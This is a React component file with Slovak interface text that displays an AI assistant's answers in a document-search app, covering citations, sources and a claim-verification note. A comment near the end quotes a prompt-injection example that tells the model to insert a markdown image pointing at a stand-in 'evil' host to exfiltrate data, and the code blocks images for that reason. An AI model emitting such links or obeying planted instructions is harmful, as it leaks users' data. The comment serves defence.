import { Badge } from '@/components/ui/badge'
import { Button } from '@/components/ui/button'
import type { DocType, GeneratedDoc, SourceRef, Verification } from '@/lib/api'
import { cn } from '@/lib/utils'
import {
  Alert02Icon,
  CheckmarkCircle02Icon,
  Download04Icon,
  File02Icon,
  Pdf01Icon,
  Search01Icon,
  Table01Icon,
  ViewIcon,
} from '@hugeicons/core-free-icons'
import { HugeiconsIcon } from '@hugeicons/react'
import { useState } from 'react'
import ReactMarkdown from 'react-markdown'

const DOC_TYPE_LABEL: Record<DocType, string> = {
  free: 'Dokument',
  report: 'Report',
  offer: 'Cenová ponuka',
  memo: 'Memo',
  summary: 'Súhrn',
}

const plural = (n: number, one: string, few: string, many: string) =>
  n === 1 ? one : n >= 2 && n <= 4 ? few : many

function DocumentCard({ doc, onOpen }: { doc: GeneratedDoc; onOpen: () => void }) {
  return (
    <div className="flex flex-wrap items-center gap-3 rounded-lg border bg-card p-3">
      <div className="flex size-10 shrink-0 items-center justify-center rounded-md bg-primary/10 text-primary">
        <HugeiconsIcon icon={Pdf01Icon} className="size-5" />
      </div>
      <div className="min-w-0 flex-1">
        <p className="truncate text-sm font-medium">{doc.title}</p>
        <p className="truncate text-xs text-muted-foreground">
          {DOC_TYPE_LABEL[doc.doc_type]} · PDF · {doc.pages} {plural(doc.pages, 'strana', 'strany', 'strán')} ·{' '}
          {doc.sections.length} {plural(doc.sections.length, 'sekcia', 'sekcie', 'sekcií')}
        </p>
      </div>
      <div className="flex gap-2">
        <Button variant="outline" size="sm" onClick={onOpen}>
          <HugeiconsIcon icon={ViewIcon} className="size-4" /> Otvoriť
        </Button>
        <Button size="sm" asChild>
          <a href={`${doc.url}?download=true`} download={doc.filename}>
            <HugeiconsIcon icon={Download04Icon} className="size-4" /> Stiahnuť
          </a>
        </Button>
      </div>
    </div>
  )
}

/** "[1, 2]" in the answer → links the markdown renderer turns into citation buttons. */
function linkifyCitations(content: string): string {
  return content.replace(/\[(\d+(?:\s*,\s*\d+)*)\]/g, (_m, nums: string) =>
    nums
      .split(',')
      .map((x) => `[${x.trim()}](#src-${x.trim()})`)
      .join(' '),
  )
}

function SourceChip({ source, onOpen }: { source: SourceRef; onOpen: () => void }) {
  const icon = source.type === 'table_summary' ? Table01Icon : File02Icon
  const pages =
    source.page_to !== source.page_from ? `${source.page_from}–${source.page_to}` : `${source.page_from}`
  return (
    <button
      type="button"
      onClick={onOpen}
      title={source.snippet}
      aria-label={`Zdroj ${source.n}: ${source.filename}, strana ${pages}`}
      className="group rounded-md focus-visible:ring-2 focus-visible:ring-ring focus-visible:outline-none"
    >
      <Badge variant="outline" className="gap-1 group-hover:bg-secondary">
        <span className="font-semibold">{source.n}</span>
        <HugeiconsIcon icon={icon} className="size-3" />
        <span className="max-w-40 truncate">{source.filename}</span>
        <span className="text-muted-foreground">str. {pages}</span>
      </Badge>
    </button>
  )
}

function VerificationNote({ verification }: { verification: Verification }) {
  const checked = verification.sentences
  const [open, setOpen] = useState(false)
  if (checked.length === 0) return null
  const flagged = checked.filter((c) => c.status !== 'supported')
  const allOk = flagged.length === 0
  return (
    <div className="text-xs">
      <button
        type="button"
        onClick={() => setOpen((o) => !o)}
        disabled={allOk}
        aria-expanded={allOk ? undefined : open}
        className={cn('flex items-center gap-1.5 text-left', allOk ? 'text-success' : 'text-warning')}
      >
        <HugeiconsIcon icon={allOk ? CheckmarkCircle02Icon : Alert02Icon} className="size-3.5 shrink-0" />
        {allOk
          ? checked.length === 1
            ? 'tvrdenie má oporu v citovanom zdroji'
            : checked.length <= 4
              ? `všetky ${checked.length} tvrdenia majú oporu v citovanom zdroji`
              : `všetkých ${checked.length} tvrdení má oporu v citovanom zdroji`
          : `${flagged.length} z ${checked.length} tvrdení bez jasnej opory v citovanom zdroji`}
      </button>
      {open && !allOk && (
        <ul className="mt-1.5 space-y-1 border-l-2 border-warning/40 pl-3 text-muted-foreground">
          {flagged.map((c, i) => (
            <li key={i}>
              <span className="font-medium text-foreground">
                {c.status === 'uncited' ? 'bez citácie' : `slabá opora v [${c.citations.join(', ')}]`}:
              </span>{' '}
              {c.text}
            </li>
          ))}
        </ul>
      )}
    </div>
  )
}

/** Assistant answer: rewritten query, generated document, markdown with citations, sources. */
export function AssistantBody({
  content,
  sources,
  document,
  rewritten,
  verification,
  onCite,
  onOpenDocument,
}: {
  content: string
  sources: SourceRef[] | null
  document?: GeneratedDoc | null
  rewritten?: string | null
  verification?: Verification | null
  onCite: (n: number) => void
  onOpenDocument: (doc: GeneratedDoc) => void
}) {
  return (
    <div className="space-y-2">
      {rewritten && (
        <p className="flex items-center gap-1.5 text-xs text-muted-foreground">
          <HugeiconsIcon icon={Search01Icon} className="size-3" /> hľadal som: „{rewritten}“
        </p>
      )}
      {document && <DocumentCard doc={document} onOpen={() => onOpenDocument(document)} />}
      <div className="prose prose-sm dark:prose-invert max-w-none text-sm leading-relaxed break-words [&_li]:my-0.5 [&_ol]:list-decimal [&_ol]:pl-5 [&_p]:my-2 [&_ul]:my-2 [&_ul]:list-disc [&_ul]:pl-5">
        <ReactMarkdown
          components={{
            a: ({ href, children }) =>
              href?.startsWith('#src-') ? (
                <button
                  type="button"
                  onClick={() => onCite(Number(href.slice(5)))}
                  aria-label={`Otvoriť zdroj ${href.slice(5)}`}
                  className="mx-0.5 inline-flex size-4 items-center justify-center rounded bg-secondary align-super text-[0.625rem] font-semibold text-secondary-foreground hover:bg-primary hover:text-primary-foreground focus-visible:ring-2 focus-visible:ring-ring focus-visible:outline-none"
                >
                  {children}
                </button>
              ) : href && /^https?:\/\//i.test(href) ? (
                <a href={href} target="_blank" rel="noopener noreferrer nofollow">
                  {children}
                </a>
              ) : (
                <span>{children}</span>
              ),
            // images in answers are never loaded — the URL could exfiltrate data
            // (prompt injection in a document: "insert ![](https://evil/?q=…)")
            img: () => null,
          }}
        >
          {linkifyCitations(content)}
        </ReactMarkdown>
      </div>
      {verification && <VerificationNote verification={verification} />}
      {sources && sources.length > 0 && (
        <div className="flex flex-wrap gap-1.5">
          {sources.map((s) => (
            <SourceChip key={s.n} source={s} onOpen={() => onCite(s.n)} />
          ))}
        </div>
      )}
    </div>
  )
}
